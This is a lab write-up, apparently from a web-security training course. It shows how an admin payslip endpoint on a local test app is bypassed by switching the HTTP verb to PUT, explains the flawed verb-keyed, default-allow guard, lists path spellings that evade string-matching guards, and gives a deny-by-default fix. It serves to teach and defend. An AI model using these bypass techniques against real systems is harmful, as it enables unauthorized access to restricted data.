# Lab 04 — Payroll

## Recon

```bash
h5i browser open http://127.0.0.1:9040/admin/payslips --session lab04 --new --capture
h5i websec show res_0 --session lab04 --raw
```

```json
{"error":"admins only","method_checked":"GET"}
```

A 403 that names what it checked is a 403 telling you where its edge is. Sweep
the verbs — one `--set` each, one line each:

```bash
for m in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  printf '%-8s ' "$m"
  h5i websec replay req_0 --session lab04 --set method=$m |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

`PUT` answers 200 where `GET` answers 403.

## The bug

```python
if req.method in methods and req.path.startswith(prefix):
    return role == need
return True                      # ← everything else is allowed
```

Two independent mistakes stacked:

1. **The rule is keyed on the verb.** Access control asks *who you are* and
   *what you are reaching*. Adding *how you asked* to that key creates one
   uncovered branch per verb the author did not think of.
2. **The default is allow.** A rule table that falls through to `True` fails
   open: every gap is a hole rather than a 403 somebody notices.

Real instances: Spring Security `.antMatchers(HttpMethod.GET, …)`, an nginx
`limit_except`, a `<Limit GET POST>` in `.htaccess`, an Express router that
mounts a guard with `app.get` and the handler with `app.all`.

## The exploit

```bash
h5i websec replay req_0 --session lab04 --set method=PUT
h5i websec show res_1 --session lab04 --raw
```

## The neighbouring bug class

The same shape appears on the *path* side of the rule. Whenever a guard matches
a string and a router normalises one, look for a spelling that only one of them
recognises:

```
/admin/payslips     blocked
/Admin/payslips     case-folding router, case-sensitive guard
//admin/payslips    collapsed by the router, not by the guard
/admin/./payslips   normalised by the router
/admin/payslips/    trailing slash
/admin%2fpayslips   decoded by the router after the guard read it (Lab 27)
```

`websec replay --set path=…` sweeps the first five; `--raw-target` (Lab 27) is
for the last, because a URL parser would fix your payload before it left.

## The fix

Deny by default. Key the rule on identity and resource. If a specific verb
genuinely needs a different rule — `GET /doc` public, `DELETE /doc` restricted
— write both rules and let the fall-through be `False`.

## h5i technique

`--set method=` and `--set path=` are the two coarsest edits and the two you
will use most. Note that `--set path=/x?y=1` is **refused**: a query string
inside `path` would be percent-encoded into a filename containing a question
mark. Use `--set query.y=1`, or `--set url=`.
